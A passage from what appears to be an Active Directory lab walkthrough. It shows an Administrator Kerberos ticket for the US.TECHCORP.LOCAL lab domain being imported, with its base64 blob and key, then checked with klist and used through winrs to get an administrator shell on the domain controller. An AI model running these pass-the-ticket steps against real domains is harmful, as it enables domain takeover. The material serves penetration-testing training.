QqgX6A3CnGNUl0LcMRieHqa9o5FT1U/3uTwJkMYtS9/j0GAtzt5/EjD0IWIz2N+fkc+f7Bz+vRScPis8Wt2cIWXy0MEjUMHYyjW71Z2RYYo+iV7SRmtD5m9m3UP797emkFgk5WHC2n6jxT+8cGKPj8oVTjcKIv12bYn2WQ4Gyjl+J1eq6T6JDQay8JoX70Ya4PhrmSyFW+VKWWlRalpi2MJlMcDJ0A9iCaEeVkSev5Q5OKIjV4Ii046sEz4XQDpkPciGQ1Tx9ns3miYnIg9ml/o9DMbWsjYmeFPcP+cCgFJGQslFqkHfSOlzakmVQotuko1N/skkZUA2n0cKwr/9ujgeowgeegAwIBAKKB3wSB3H2B2TCB1qCB0zCB0DCBzaAbMBmgAwIBF6ESBBAW1daEY6IvDcRsc3vlP2FboRMbEVVTLlRFQ0hDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOEAAKURGA8yMDIzMDIyMjE5MDMzMFqmERgPMjAyMzAyMjMwNTAzMzBapxEYDzIwMjMwMzAxMTkwMzMwWqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRdXMudGVjaGNvcnAubG9jYWw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/us.techcorp.local
  ServiceRealm             :  US.TECHCORP.LOCAL
  UserName                 :  Administrator
  UserRealm                :  US.TECHCORP.LOCAL
  StartTime                :  2/22/2023 11:03:30 AM
  EndTime                  :  2/22/2023 9:03:30 PM
  RenewTill                :  3/1/2023 11:03:30 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  FtXWhGOiLw3EbHN75T9hWw==
  ASREP (key)              :  69A3667CEE956F4B563FF10ADEF27060

```

Validate:

```
C:\Windows\system32>klist

Current LogonId is 0:0x184bfdc

Cached Tickets: (3)

#0>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/22/2023 11:05:03 (local)
        End Time:   2/22/2023 21:03:30 (local)
        Renew Time: 3/1/2023 11:03:30 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: US-DC.us.techcorp.local

#1>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: krbtgt/us.techcorp.local @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/22/2023 11:03:30 (local)
        End Time:   2/22/2023 21:03:30 (local)
        Renew Time: 3/1/2023 11:03:30 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#2>     Client: Administrator @ US.TECHCORP.LOCAL
        Server: HTTP/us-dc @ US.TECHCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 2/22/2023 11:05:03 (local)
        End Time:   2/22/2023 21:03:30 (local)
        Renew Time: 3/1/2023 11:03:30 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: US-DC.us.techcorp.local

C:\Windows\system32>winrs -r:us-dc cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>hostname
hostname
US-DC

C:\Users\Administrator>whoami
whoami
us\administrator
```

Same procedure for Enterprise ADmin
